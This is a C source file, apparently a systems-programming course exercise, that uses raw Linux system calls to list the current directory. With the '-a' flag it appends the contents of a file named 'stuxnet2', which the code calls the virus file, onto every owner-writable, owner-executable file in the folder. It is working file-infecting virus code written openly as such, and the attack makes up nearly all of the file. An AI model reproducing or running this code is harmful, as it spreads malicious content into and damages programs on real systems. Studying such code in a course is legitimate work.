#include "util.h"
#include "task2.h"

#define STDOUT 1
#define SYS_EXIT 1
#define SYS_READ 3
#define SYS_WRITE 4
#define SYS_OPEN 5
#define SYS_CLOSE 6
#define SYS_STAT 106
#define SYS_GETDENTS 141

#define S_IWUSR 00200
#define S_IXUSR 00100

#define MAX_SIZE 8192

int main (int argc , char* argv[], char* envp[])
{
  char buf[MAX_SIZE];
  char bufy[MAX_SIZE];
  char vbuf[MAX_SIZE];
  struct linux_dirent *dnt =(struct linux_dirent*)buf;
  struct stat *sta =(struct stat*)bufy;
  int sum=0,exec=0,stati,v_size=0,k;
  char* str,*v_name="stuxnet2";
  int vFile=system_call(SYS_OPEN,v_name,0,0);
  if(vFile<0){
	str="cannot open virus file.\n";
	system_call(SYS_WRITE,STDOUT,str,strlen(str));
	system_call(SYS_EXIT, 0x55);
  }
  else{
	system_call(SYS_READ,vFile,vbuf,MAX_SIZE);
	system_call(SYS_STAT,v_name,sta);
	v_size = sta->st_size;
	/*
	str=itoa(v_size);
	system_call(SYS_WRITE,STDOUT,str,strlen(str));
	system_call(SYS_WRITE,STDOUT,"\n",1);
	*/
  }
  if (argc>1){
     if (strcmp(argv[1],"-e") ==0){
	exec=1;
     }
     else if(strcmp(argv[1],"-a") ==0){
	exec=2;
     }
  }

  int target=system_call(SYS_OPEN,".",0);
  int size=system_call(SYS_GETDENTS,target,buf,MAX_SIZE);
  while(sum<size){
	  if(dnt->d_name[0] != '.'){
		if(exec>0){
			if(exec==1){
				system_call(SYS_STAT,dnt->d_name,sta);
				stati = sta->st_mode & S_IWUSR;
				if (stati != 0){
					stati = sta->st_mode & S_IXUSR;
					if (stati != 0){
						system_call(SYS_WRITE,STDOUT,dnt->d_name,strlen(dnt->d_name));
		  				system_call(SYS_WRITE,STDOUT,"\n",1);
					}
				}
			}
			else if(exec==2 && strcmp(dnt->d_name,v_name)!=0){
				system_call(SYS_STAT,dnt->d_name,sta);
				stati = sta->st_mode & S_IWUSR;
				if (stati != 0){
					stati = sta->st_mode & S_IXUSR;
					if (stati != 0){
		  				int tFile=system_call(SYS_OPEN,dnt->d_name,2|1024,00600);
						if(tFile<0){
							str="cannot open file.\n";
							system_call(SYS_WRITE,STDOUT,str,strlen(str));
							system_call(SYS_EXIT, 0x55);
						}
						else{
							k=system_call(SYS_WRITE,tFile,vbuf,v_size);
						}
						system_call(SYS_WRITE,STDOUT,dnt->d_name,strlen(dnt->d_name));
						/*
						system_call(SYS_WRITE,STDOUT," ",1);
						str=itoa(k);
						system_call(SYS_WRITE,STDOUT,str,strlen(str));
						*/
		  				system_call(SYS_WRITE,STDOUT,"\n",1);
						system_call(SYS_CLOSE, tFile);
					}
				}
			}
		}
		else{
			system_call(SYS_WRITE,STDOUT,dnt->d_name,strlen(dnt->d_name));
	  		system_call(SYS_WRITE,STDOUT,"\n",1);
		}
	  }
	  sum+=dnt->d_reclen;
	  dnt=(struct linux_dirent*)(buf+sum);
  }
  system_call(SYS_WRITE,STDOUT,"\n",1);
  system_call(SYS_WRITE,STDOUT,"\n",1);
  system_call(SYS_CLOSE, vFile);
  return 0;
}